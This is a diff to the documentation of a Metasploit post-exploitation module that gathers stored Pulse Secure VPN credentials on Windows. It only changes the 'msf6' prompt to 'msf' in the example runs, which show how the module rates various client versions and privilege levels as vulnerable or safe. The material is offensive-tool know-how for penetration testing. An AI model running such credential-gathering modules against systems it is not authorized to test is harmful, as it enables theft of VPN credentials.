@@ -39,7 +39,7 @@ end
 ### Pulse Secure 9.0.4 on Microsoft Windows 10 Enterprise 19042
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.0.4.1731.
 [+] This version is considered vulnerable.
@@ -58,7 +58,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 With leftovers from previously installed version (9.0.4):
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.0.5.1907.
 [!] You're executing from an unprivileged process so this version is considered safe.
@@ -77,7 +77,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 Without any leftovers from previously installed versions:
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.0.5.1907.
 [!] You're executing from an unprivileged process so this version is considered safe.
@@ -91,7 +91,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 ### Pulse Secure 9.0.5 on Microsoft Windows 10 Enterprise 19042 (Elevated)
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.0.5.1907.
 [+] You're executing from a privileged process so this version is considered vulnerable.
@@ -108,7 +108,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 ### Pulse Secure 9.1.3 on Microsoft Windows 10 Enterprise 19042
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.1.3.1313.
 [+] This version is considered vulnerable.
@@ -127,7 +127,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 With leftovers from previously installed version (9.1.3):
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.1.4.1955.
 [!] You're executing from an unprivileged process so this version is considered safe.
@@ -146,7 +146,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 Without leftovers:
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.1.4.1955.
 [!] You're executing from an unprivileged process so this version is considered safe.
@@ -159,7 +159,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 ### Pulse Secure 9.1.4 on Microsoft Windows 10 Enterprise 19042 (Elevated)
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [*] Target is running Pulse Secure Connect build 9.1.4.1955.
 [+] You're executing from a privileged process so this version is considered vulnerable.
@@ -176,7 +176,7 @@ msf6 post(windows/gather/credentials/pulse_secure) > run
 ### Host without Pulse Secure
 
 ```
-msf6 post(windows/gather/credentials/pulse_secure) > run
+msf post(windows/gather/credentials/pulse_secure) > run
 
 [-] Pulse Secure Connect client is not installed on this system
 [*] Post module execution completed
